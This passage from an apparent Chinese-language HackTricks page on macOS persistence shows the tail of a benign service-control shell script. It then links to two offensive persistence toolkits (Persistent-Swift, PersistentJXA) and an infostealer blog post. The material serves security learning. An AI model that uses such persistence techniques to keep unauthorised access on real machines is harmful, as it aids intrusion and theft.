if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## 持久性技术与工具

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## 参考资料

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
